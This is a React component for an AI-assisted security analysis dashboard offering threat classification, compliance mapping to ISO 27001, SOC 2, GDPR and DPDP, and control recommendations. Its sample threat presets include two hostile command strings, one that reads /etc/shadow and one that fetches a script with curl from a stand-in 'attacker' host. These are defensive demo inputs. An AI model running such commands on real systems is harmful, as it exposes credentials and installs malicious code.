// AIPage.jsx
import { useState } from 'react'
import { aiApi } from '../services/api'
import { Cpu, Send, AlertTriangle, Sparkles, ShieldCheck, Layers, AlertCircle } from 'lucide-react'

const THREAT_SAMPLES = [
  'Repeated SSH brute force attempts on port 2222 with root user',
  'Mass port scan across ports 21, 22, 80, 443, 3306 from single IP',
  'Execution of sudo su && cat /etc/shadow after initial login',
  'Download of malicious shell script via curl -s http://attacker/xmr.sh',
]

const COMPLIANCE_SAMPLES = [
  'No multi-factor authentication enforced on administrative SSH logins',
  'Customer passwords stored using legacy SHA1 hashing instead of bcrypt/Argon2',
  'Security audit logs retained for only 7 days instead of mandated 90 days',
  'No formal privileged access review conducted in the past 12 months',
]

const CONTROL_SAMPLES = [
  { threat: 'SSH Brute Force', asset: 'Production Linux Server' },
  { threat: 'SQL Injection', asset: 'Customer Portal Web API' },
  { threat: 'Ransomware / Malware Dropper', asset: 'Internal File Storage' },
  { threat: 'Privilege Escalation', asset: 'Kubernetes Worker Node' },
]

export default function AIPage() {
  const [threatInput, setThreatInput] = useState(THREAT_SAMPLES[0])
  const [complianceInput, setComplianceInput] = useState(COMPLIANCE_SAMPLES[0])
  const [controlInput, setControlInput] = useState(CONTROL_SAMPLES[0])
  const [threatResult, setThreatResult] = useState(null)
  const [complianceResult, setComplianceResult] = useState(null)
  const [controlResult, setControlResult] = useState(null)
  const [loading, setLoading] = useState({})
  const [errors, setErrors] = useState({})

  const call = async (key, fn) => {
    setLoading(l => ({ ...l, [key]: true }))
    setErrors(e => ({ ...e, [key]: null }))
    try {
      const r = await fn()
      return r.data
    } catch (err) {
      console.error(err)
      setErrors(e => ({ ...e, [key]: err.response?.data?.detail || 'Analysis request failed. Please try again.' }))
      return null
    } finally {
      setLoading(l => ({ ...l, [key]: false }))
    }
  }

  const handleClassifyThreat = async (textToUse) => {
    const query = textToUse || threatInput
    if (!query) return
    const r = await call('threat', () => aiApi.analyzeEvent(query))
    if (r?.analysis) setThreatResult(r.analysis)
  }

  const handleComplianceMapping = async (textToUse) => {
    const query = textToUse || complianceInput
    if (!query) return
    const r = await call('compliance', () => aiApi.complianceMapping(query))
    if (r?.mapping) setComplianceResult(r.mapping)
  }

  const handleControlRecs = async (threatToUse, assetToUse) => {
    const t = threatToUse || controlInput.threat
    const a = assetToUse || controlInput.asset
    if (!t) return
    const r = await call('controls', () => aiApi.recommendControls(t, a))
    if (r?.recommendations) setControlResult(r.recommendations)
  }

  return (
    <div className="animate-fade-in-up">
      <div className="page-hero">
        <div className="page-hero-watermark">AI</div>
        <div className="page-hero-eyebrow">Advisory Layer Only</div>
        <h1 className="page-hero-title">AI Security Analysis</h1>
        <p className="page-hero-sub">
          Google Gemini-powered analysis with automated heuristic fallbacks. AI is <strong>assistive only</strong> —
          it does not replace deterministic detection rules, override risk scores, or constitute legal compliance determinations.
        </p>
      </div>

      <div className="ai-disclaimer" style={{ marginBottom: 24, fontSize: '0.82rem' }}>
        <AlertTriangle size={16} style={{ flexShrink: 0 }} />
        All AI outputs carry the following disclaimer: <strong>AI-generated recommendation — analyst review required.</strong>
        These outputs are advisory only and do not constitute final security determinations.
      </div>

      <div className="panel-grid-2" style={{ gap: 20 }}>
        {/* Threat Classification */}
        <div className="panel">
          <div className="panel-header">
            <div>
              <div className="panel-title" style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                <Cpu size={16} style={{ color: 'var(--burgundy-600)' }} />
                Threat Classification
              </div>
              <div className="panel-subtitle">Classify a security event and assess severity</div>
            </div>
          </div>
          <div className="panel-body">
            <div className="form-group">
              <label className="form-label">Describe the security event</label>
              <textarea
                className="form-control"
                rows={3}
                value={threatInput}
                onChange={e => setThreatInput(e.target.value)}
                placeholder="e.g. Repeated SSH authentication failures from a single source within 5 minutes"
              />
            </div>

            <div style={{ marginBottom: 14 }}>
              <div style={{ fontSize: '0.68rem', fontWeight: 600, color: 'var(--charcoal-500)', marginBottom: 6, textTransform: 'uppercase', letterSpacing: '0.05em' }}>
                Quick Presets:
              </div>
              <div style={{ display: 'flex', gap: 6, flexWrap: 'wrap' }}>
                {THREAT_SAMPLES.map((s, i) => (
                  <button
                    key={i}
                    type="button"
                    className="badge badge-neutral"
                    style={{ cursor: 'pointer', border: '1px solid var(--cream-300)', padding: '4px 8px', fontSize: '0.7rem' }}
                    onClick={() => {
                      setThreatInput(s)
                      handleClassifyThreat(s)
                    }}
                  >
                    Preset {i + 1}
                  </button>
                ))}
              </div>
            </div>

            {errors.threat && (
              <div className="alert alert-error" style={{ marginBottom: 12, display: 'flex', alignItems: 'center', gap: 8, fontSize: '0.78rem' }}>
                <AlertCircle size={14} />
                <span>{errors.threat}</span>
              </div>
            )}

            <button
              className="btn btn-primary"
              disabled={!threatInput || loading.threat}
              onClick={() => handleClassifyThreat()}
            >
              {loading.threat ? (
                <>
                  <div className="spinner" style={{ width: 14, height: 14, borderWidth: 2 }} />
                  Analyzing…
                </>
              ) : (
                <>
                  <Sparkles size={14} /> Classify Threat
                </>
              )}
            </button>

            {threatResult && <AIResultCard result={threatResult} />}
          </div>
        </div>

        {/* Compliance Mapping */}
        <div className="panel">
          <div className="panel-header">
            <div>
              <div className="panel-title" style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                <ShieldCheck size={16} style={{ color: 'var(--burgundy-600)' }} />
                Compliance Mapping
              </div>
              <div className="panel-subtitle">AI-suggested control mappings (reference only)</div>
            </div>
          </div>
          <div className="panel-body">
            <div className="form-group">
              <label className="form-label">Describe the finding or gap</label>
              <textarea
                className="form-control"
                rows={3}
                value={complianceInput}
                onChange={e => setComplianceInput(e.target.value)}
                placeholder="e.g. No periodic privileged account review process exists"
              />
            </div>

            <div style={{ marginBottom: 14 }}>
              <div style={{ fontSize: '0.68rem', fontWeight: 600, color: 'var(--charcoal-500)', marginBottom: 6, textTransform: 'uppercase', letterSpacing: '0.05em' }}>
                Quick Presets:
              </div>
              <div style={{ display: 'flex', gap: 6, flexWrap: 'wrap' }}>
                {COMPLIANCE_SAMPLES.map((s, i) => (
                  <button
                    key={i}
                    type="button"
                    className="badge badge-neutral"
                    style={{ cursor: 'pointer', border: '1px solid var(--cream-300)', padding: '4px 8px', fontSize: '0.7rem' }}
                    onClick={() => {
                      setComplianceInput(s)
                      handleComplianceMapping(s)
                    }}
                  >
                    Preset {i + 1}
                  </button>
                ))}
              </div>
            </div>

            {errors.compliance && (
              <div className="alert alert-error" style={{ marginBottom: 12, display: 'flex', alignItems: 'center', gap: 8, fontSize: '0.78rem' }}>
                <AlertCircle size={14} />
                <span>{errors.compliance}</span>
              </div>
            )}

            <button
              className="btn btn-primary"
              disabled={!complianceInput || loading.compliance}
              onClick={() => handleComplianceMapping()}
            >
              {loading.compliance ? (
                <>
                  <div className="spinner" style={{ width: 14, height: 14, borderWidth: 2 }} />
                  Mapping…
                </>
              ) : (
                <>
                  <Sparkles size={14} /> Suggest Mappings
                </>
              )}
            </button>

            {complianceResult && <ComplianceMappingCard result={complianceResult} />}
          </div>
        </div>

        {/* Control Recommendations */}
        <div className="panel" style={{ gridColumn: '1 / -1' }}>
          <div className="panel-header">
            <div>
              <div className="panel-title" style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
                <Layers size={16} style={{ color: 'var(--burgundy-600)' }} />
                Control Recommendations
              </div>
              <div className="panel-subtitle">AI-suggested preventive, detective, and corrective controls</div>
            </div>
          </div>
          <div className="panel-body">
            <div className="form-grid-2">
              <div className="form-group">
                <label className="form-label">Threat Type</label>
                <input
                  className="form-control"
                  value={controlInput.threat}
                  onChange={e => setControlInput(c => ({ ...c, threat: e.target.value }))}
                  placeholder="e.g. Brute Force"
                />
              </div>
              <div className="form-group">
                <label className="form-label">Asset</label>
                <input
                  className="form-control"
                  value={controlInput.asset}
                  onChange={e => setControlInput(c => ({ ...c, asset: e.target.value }))}
                  placeholder="e.g. SSH server"
                />
              </div>
            </div>

            <div style={{ marginBottom: 14 }}>
              <div style={{ fontSize: '0.68rem', fontWeight: 600, color: 'var(--charcoal-500)', marginBottom: 6, textTransform: 'uppercase', letterSpacing: '0.05em' }}>
                Quick Presets:
              </div>
              <div style={{ display: 'flex', gap: 6, flexWrap: 'wrap' }}>
                {CONTROL_SAMPLES.map((s, i) => (
                  <button
                    key={i}
                    type="button"
                    className="badge badge-neutral"
                    style={{ cursor: 'pointer', border: '1px solid var(--cream-300)', padding: '4px 8px', fontSize: '0.7rem' }}
                    onClick={() => {
                      setControlInput(s)
                      handleControlRecs(s.threat, s.asset)
                    }}
                  >
                    {s.threat} ({s.asset})
                  </button>
                ))}
              </div>
            </div>

            {errors.controls && (
              <div className="alert alert-error" style={{ marginBottom: 12, display: 'flex', alignItems: 'center', gap: 8, fontSize: '0.78rem' }}>
                <AlertCircle size={14} />
                <span>{errors.controls}</span>
              </div>
            )}

            <button
              className="btn btn-primary"
              disabled={!controlInput.threat || loading.controls}
              onClick={() => handleControlRecs()}
            >
              {loading.controls ? (
                <>
                  <div className="spinner" style={{ width: 14, height: 14, borderWidth: 2 }} />
                  Recommending…
                </>
              ) : (
                <>
                  <Sparkles size={14} /> Recommend Controls
                </>
              )}
            </button>

            {controlResult && <ControlRecsCard result={controlResult} />}
          </div>
        </div>
      </div>
    </div>
  )
}

function AIResultCard({ result }) {
  if (!result) return null
  return (
    <div style={{ marginTop: 16, padding: 18, background: 'var(--cream-50)', borderRadius: 10, border: '1px solid var(--cream-300)' }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 12 }}>
        <div style={{ fontWeight: 700, fontSize: '0.95rem', color: 'var(--charcoal-900)' }}>
          {result.classification || 'Threat Analysis Result'}
        </div>
        {result.severity && (
          <span className={`badge badge-${result.severity.toLowerCase()}`}>
            {result.severity}
          </span>
        )}
      </div>
      <Row label="Confidence" value={result.confidence} />
      <Row label="Threat Vector / Reason" value={result.reason} />
      <Row label="Potential Business Impact" value={result.potential_impact} />
      <Row label="Recommended Action" value={result.recommended_action} />
      <div className="ai-disclaimer" style={{ marginTop: 14 }}>
        {result.disclaimer ? (result.disclaimer.startsWith('⚠️') ? result.disclaimer : `⚠️ ${result.disclaimer}`) : '⚠️ AI-generated recommendation — analyst review required.'}
      </div>
    </div>
  )
}

function ComplianceMappingCard({ result }) {
  if (!result) return null
  return (
    <div style={{ marginTop: 16, padding: 18, background: 'var(--cream-50)', borderRadius: 10, border: '1px solid var(--cream-300)' }}>
      <div style={{ display: 'flex', justifyContent: 'space-between', alignItems: 'center', marginBottom: 14, borderBottom: '1px solid var(--cream-200)', paddingBottom: 8 }}>
        <div style={{ fontWeight: 700, fontSize: '0.9rem', color: 'var(--charcoal-900)' }}>
          Suggested Framework Mappings
        </div>
        {result.mapping_confidence && (
          <span className="badge badge-low" style={{ fontSize: '0.72rem' }}>
            Confidence: {result.mapping_confidence}
          </span>
        )}
      </div>

      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(auto-fit, minmax(220px, 1fr))', gap: 12, marginBottom: 14 }}>
        {result.iso_27001 && (
          <div style={{ padding: 12, background: '#fff', borderRadius: 8, border: '1px solid var(--cream-300)' }}>
            <div className="eyebrow" style={{ color: 'var(--burgundy-600)', marginBottom: 4 }}>ISO/IEC 27001:2022</div>
            <div style={{ fontSize: '0.85rem', fontWeight: 600, color: 'var(--charcoal-900)' }}>{result.iso_27001.clause || result.iso_27001.control_area}</div>
            <div style={{ fontSize: '0.75rem', color: 'var(--charcoal-600)', marginTop: 2 }}>{result.iso_27001.domain} — {result.iso_27001.control_area}</div>
          </div>
        )}

        {result.soc_2 && (
          <div style={{ padding: 12, background: '#fff', borderRadius: 8, border: '1px solid var(--cream-300)' }}>
            <div className="eyebrow" style={{ color: 'var(--burgundy-600)', marginBottom: 4 }}>SOC 2 Type II</div>
            <div style={{ fontSize: '0.85rem', fontWeight: 600, color: 'var(--charcoal-900)' }}>{result.soc_2.trust_service_criterion}</div>
            <div style={{ fontSize: '0.75rem', color: 'var(--charcoal-600)', marginTop: 2 }}>{result.soc_2.description}</div>
          </div>
        )}

        {result.gdpr && (
          <div style={{ padding: 12, background: '#fff', borderRadius: 8, border: '1px solid var(--cream-300)' }}>
            <div className="eyebrow" style={{ color: 'var(--burgundy-600)', marginBottom: 4 }}>EU GDPR</div>
            <div style={{ fontSize: '0.85rem', fontWeight: 600, color: 'var(--charcoal-900)' }}>{result.gdpr.article}</div>
            <div style={{ fontSize: '0.75rem', color: 'var(--charcoal-600)', marginTop: 2 }}>{result.gdpr.principle}</div>
          </div>
        )}

        {result.dpdp_2023 && (
          <div style={{ padding: 12, background: '#fff', borderRadius: 8, border: '1px solid var(--cream-300)' }}>
            <div className="eyebrow" style={{ color: 'var(--burgundy-600)', marginBottom: 4 }}>India DPDP Act 2023</div>
            <div style={{ fontSize: '0.85rem', fontWeight: 600, color: 'var(--charcoal-900)' }}>{result.dpdp_2023.section}</div>
            <div style={{ fontSize: '0.75rem', color: 'var(--charcoal-600)', marginTop: 2 }}>{result.dpdp_2023.obligation}</div>
          </div>
        )}
      </div>

      {result.analyst_notes && (
        <div style={{ padding: 12, background: 'rgba(139, 26, 47, 0.05)', borderRadius: 8, border: '1px solid rgba(139, 26, 47, 0.15)', marginBottom: 12 }}>
          <div className="eyebrow" style={{ color: 'var(--burgundy-600)', marginBottom: 4 }}>Analyst Action & Remediation Notes</div>
          <div style={{ fontSize: '0.82rem', color: 'var(--charcoal-800)', lineHeight: 1.5 }}>{result.analyst_notes}</div>
        </div>
      )}

      <div className="ai-disclaimer" style={{ marginTop: 12 }}>
        {result.disclaimer ? (result.disclaimer.startsWith('⚠️') ? result.disclaimer : `⚠️ ${result.disclaimer}`) : '⚠️ AI-Suggested Control Mapping — reference suggestions only. Not legal compliance.'}
      </div>
    </div>
  )
}

function ControlRecsCard({ result }) {
  if (!result) return null
  return (
    <div style={{ marginTop: 16, padding: 18, background: 'var(--cream-50)', borderRadius: 10, border: '1px solid var(--cream-300)' }}>
      {result.preventive_controls?.length > 0 && <ListSection title="Preventive Controls" items={result.preventive_controls} />}
      {result.detective_controls?.length > 0 && <ListSection title="Detective Controls" items={result.detective_controls} />}
      {result.corrective_controls?.length > 0 && <ListSection title="Corrective Controls" items={result.corrective_controls} />}
      {result.iso_27001_controls?.length > 0 && <ListSection title="Mapped ISO 27001 Controls" items={result.iso_27001_controls} />}
      {result.quick_wins?.length > 0 && <ListSection title="Quick Implementation Wins" items={result.quick_wins} />}
      {result.long_term_improvements?.length > 0 && <ListSection title="Long-Term Strategic Improvements" items={result.long_term_improvements} />}
      <div className="ai-disclaimer" style={{ marginTop: 14 }}>
        {result.disclaimer ? (result.disclaimer.startsWith('⚠️') ? result.disclaimer : `⚠️ ${result.disclaimer}`) : '⚠️ AI-generated recommendations — analyst review required.'}
      </div>
    </div>
  )
}

function ListSection({ title, items }) {
  return (
    <div style={{ marginBottom: 12 }}>
      <div className="eyebrow" style={{ marginBottom: 6, color: 'var(--burgundy-600)' }}>{title}</div>
      <ul style={{ paddingLeft: 18, margin: 0 }}>
        {items.map((it, i) => (
          <li key={i} style={{ fontSize: '0.82rem', color: 'var(--charcoal-800)', marginBottom: 4, lineHeight: 1.45 }}>
            {it}
          </li>
        ))}
      </ul>
    </div>
  )
}

function Row({ label, value }) {
  if (!value) return null
  return (
    <div style={{ marginBottom: 8 }}>
      <span style={{ fontSize: '0.68rem', fontWeight: 700, textTransform: 'uppercase', letterSpacing: '0.08em', color: 'var(--burgundy-600)' }}>{label}: </span>
      <span style={{ fontSize: '0.82rem', color: 'var(--charcoal-800)' }}>{value}</span>
    </div>
  )
}
